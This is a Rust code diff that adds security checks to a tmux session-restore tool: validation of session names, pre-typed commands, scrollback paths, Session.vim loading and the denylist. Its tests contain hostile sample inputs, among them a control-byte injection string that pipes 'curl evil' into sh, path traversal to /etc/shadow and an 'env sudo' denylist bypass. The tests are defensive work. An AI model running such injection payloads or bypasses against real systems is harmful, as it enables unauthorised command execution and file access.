@@ -69,6 +69,15 @@ pub fn restore_save(
     let live: Vec<String> = ctl.list_sessions()?.into_iter().map(|s| s.name).collect();
 
     for session in &manifest.sessions {
+        // A hostile save could name a session with tmux target metacharacters
+        // (`=`, `*`, `-`, `:`) that would address other live sessions in the
+        // kill-session/set-option calls below. Skip anything not our shape.
+        if !valid_session_name(&session.name) {
+            report
+                .notes
+                .push(format!("skipped session with invalid name {:?}", session.name));
+            continue;
+        }
         let target = if live.contains(&session.name) {
             match opts.on_conflict {
                 OnConflict::Skip => {
@@ -176,8 +185,15 @@ fn restore_session(
             for pane in &window.panes {
                 if let Some(fg) = &pane.fg
                     && !restartable(fg, opts)
-                    && !DENYLIST.contains(&fg.name.as_str())
+                    && !argv_has_denied(&fg.argv)
                 {
+                    if !is_safe_pretype(&fg.argv) {
+                        report.notes.push(format!(
+                            "refused to pre-type command with control characters in pane {}.{}",
+                            window.index, pane.index
+                        ));
+                        continue;
+                    }
                     let target = format!("{win_target}.{}", pane.index);
                     wait_for_shell(ctl, &target, &helper_name);
                     let cmdline = shell_join(&fg.argv);
@@ -266,8 +282,16 @@ fn spawn_command(
         "restore-pane".into(),
     ];
     if let Some(sb) = &pane.scrollback {
-        argv.push("--scrollback".into());
-        argv.push(save_dir.join(&sb.file).to_string_lossy().into_owned());
+        match safe_scrollback_path(save_dir, &sb.file) {
+            Some(path) => {
+                argv.push("--scrollback".into());
+                argv.push(path.to_string_lossy().into_owned());
+            }
+            None => report.notes.push(format!(
+                "refused out-of-save scrollback path {:?}; pane restored without history",
+                sb.file
+            )),
+        }
     }
     if let Some(shell) = &opts.shell {
         argv.push("--shell".into());
@@ -279,11 +303,19 @@ fn spawn_command(
             let mut exec_argv = fg.argv.clone();
             // Editor state: vim/nvim resume a Session.vim from the program's
             // cwd when present (auto-maintained by e.g. vim-obsession).
+            // SECURITY: Session.vim runs arbitrary Ex commands, so only trust
+            // one discovered in the PANE's own cwd (not a manifest-chosen
+            // directory), under $HOME, and reached without a symlink.
             if matches!(fg.name.as_str(), "vim" | "nvim" | "vi")
                 && !exec_argv.iter().any(|a| a == "-S")
+                && fg.cwd == pane.cwd
+                && home_dir().is_some_and(|h| fg.cwd.starts_with(&h))
             {
                 let session_file = fg.cwd.join("Session.vim");
-                if session_file.is_file() {
+                let is_regular = std::fs::symlink_metadata(&session_file)
+                    .map(|m| m.file_type().is_file())
+                    .unwrap_or(false);
+                if is_regular {
                     exec_argv.push("-S".into());
                     exec_argv.push(session_file.to_string_lossy().into_owned());
                 }
@@ -299,11 +331,81 @@ fn spawn_command(
     shell_join(&argv)
 }
 
+fn home_dir() -> Option<PathBuf> {
+    std::env::var_os("HOME")
+        .filter(|h| !h.is_empty())
+        .map(PathBuf::from)
+}
+
+/// Basename of a path token, lowercased (denylist/allow-list comparisons).
+fn basename_lower(s: &str) -> String {
+    Path::new(s)
+        .file_name()
+        .map(|s| s.to_string_lossy().to_ascii_lowercase())
+        .unwrap_or_default()
+}
+
+/// A denylisted program appears anywhere in argv (catches `env sudo …`,
+/// absolute `/usr/bin/sudo`, wrappers). Compared by basename, case-folded.
+fn argv_has_denied(argv: &[String]) -> bool {
+    argv.iter()
+        .any(|a| DENYLIST.contains(&basename_lower(a).as_str()))
+}
+
 fn restartable(fg: &FgProc, opts: &RestoreOptions) -> bool {
-    if fg.argv.is_empty() || DENYLIST.contains(&fg.name.as_str()) {
+    let Some(arg0) = fg.argv.first() else {
+        return false;
+    };
+    // SECURITY: the safe-list/denylist are meaningful only if they gate the
+    // program actually exec'd — argv[0] — not the manifest's advisory `name`
+    // field (an attacker controls them independently). Require them to agree,
+    // then decide on the derived basename, and refuse if ANY argv token is a
+    // denylisted program.
+    let base = basename_lower(arg0);
+    if base.is_empty() || fg.name.to_ascii_lowercase() != base {
         return false;
     }
-    opts.restart_arbitrary || opts.programs.iter().any(|p| p == &fg.name)
+    if argv_has_denied(&fg.argv) {
+        return false;
+    }
+    opts.restart_arbitrary
+        || opts
+            .programs
+            .iter()
+            .any(|p| p.to_ascii_lowercase() == base)
+}
+
+/// Pre-typing puts these bytes under the shell cursor via `send-keys -l`,
+/// below the shell's own parsing. Any control byte (Ctrl-U kill-line, CR
+/// accept-line, ESC, …) turns "text sitting at the prompt" into "command
+/// executed", so refuse to pre-type argv carrying them.
+fn is_safe_pretype(argv: &[String]) -> bool {
+    argv.iter()
+        .all(|a| a.bytes().all(|b| b >= 0x20 && b != 0x7f))
+}
+
+/// Manifest session names reach tmux `-t` targets and `set-option`; tmux
+/// target syntax treats `=`, `*`, `-`, `:` specially. Only accept our own
+/// `ht-<hex/uuid>` shape so a hostile save can't address arbitrary sessions.
+fn valid_session_name(name: &str) -> bool {
+    !name.is_empty()
+        && name.len() <= 64
+        && name
+            .bytes()
+            .all(|b| b.is_ascii_alphanumeric() || b == b'-' || b == b'_')
+}
+
+/// Resolve `sb.file` (manifest-controlled) to a path guaranteed to live
+/// inside the save dir: no absolute paths, no `..`/`.` traversal.
+fn safe_scrollback_path(save_dir: &Path, file: &Path) -> Option<PathBuf> {
+    use std::path::Component;
+    if file.components().any(|c| {
+        !matches!(c, Component::Normal(_)) // rejects RootDir, ParentDir, CurDir, Prefix
+    }) {
+        return None;
+    }
+    let full = save_dir.join(file);
+    full.starts_with(save_dir).then_some(full)
 }
 
 /// POSIX single-quote each token: safe against spaces, $, quotes, globs.
@@ -392,5 +494,76 @@ mod tests {
         let cmd = spawn_command(&p, Path::new("/tmp/save"), &opts(), &mut report);
         assert!(cmd.contains("'--exec' 'htop' '-d' '10'"));
         assert!(cmd.starts_with("'/usr/bin/hashterm' 'restore-pane'"));
+    }
+
+    // --- P0 security regressions (#1, #2, #4, #6) ---
+
+    #[test]
+    fn name_argv_mismatch_is_not_restartable() {
+        // #1: safe-list matches `name`, but argv[0] is a different binary.
+        let fg = FgProc {
+            name: "htop".into(),
+            argv: vec!["/tmp/payload".into()],
+            cwd: "/".into(),
+        };
+        let mut o = opts();
+        o.programs = vec!["htop".into()];
+        assert!(!restartable(&fg, &o));
+    }
+
+    #[test]
+    fn denylisted_token_anywhere_blocks_restart() {
+        // #1: `env sudo …` — env not denied, sudo hides in argv[1].
+        let fg = FgProc {
+            name: "env".into(),
+            argv: vec!["env".into(), "sudo".into(), "sh".into()],
+            cwd: "/".into(),
+        };
+        let mut o = opts();
+        o.programs = vec!["env".into()];
+        assert!(!restartable(&fg, &o));
+        // …and absolute-path sudo is caught by basename.
+        let fg2 = FgProc {
+            name: "ssh".into(),
+            argv: vec!["/usr/bin/sudo".into(), "-n".into()],
+            cwd: "/".into(),
+        };
+        let mut o2 = opts();
+        o2.programs = vec!["ssh".into()];
+        assert!(!restartable(&fg2, &o2));
+    }
+
+    #[test]
+    fn control_bytes_are_not_safe_to_pretype() {
+        // #2: Ctrl-U + CR injection shape.
+        assert!(!is_safe_pretype(&["\u{15}curl evil|sh\r".into()]));
+        assert!(!is_safe_pretype(&["ok".into(), "bad\n".into()]));
+        assert!(is_safe_pretype(&["make".into(), "-j8".into()]));
+    }
+
+    #[test]
+    fn scrollback_path_stays_in_save_dir() {
+        // #4: absolute and traversal both refused; a plain name is kept.
+        let root = Path::new("/tmp/save");
+        assert_eq!(
+            safe_scrollback_path(root, Path::new("panes/0.zst")),
+            Some(PathBuf::from("/tmp/save/panes/0.zst"))
+        );
+        assert_eq!(safe_scrollback_path(root, Path::new("/etc/shadow")), None);
+        assert_eq!(
+            safe_scrollback_path(root, Path::new("../../etc/x.zst")),
+            None
+        );
+    }
+
+    #[test]
+    fn session_name_shape_enforced() {
+        // #6: tmux target metacharacters rejected.
+        assert!(valid_session_name("ht-01a0121f27b69f40"));
+        assert!(!valid_session_name("*"));
+        assert!(!valid_session_name("a:b"));
+        assert!(!valid_session_name("=evil"));
+        assert!(!valid_session_name(&"x".repeat(65)));
+        assert!(!valid_session_name(""));
     }
 }
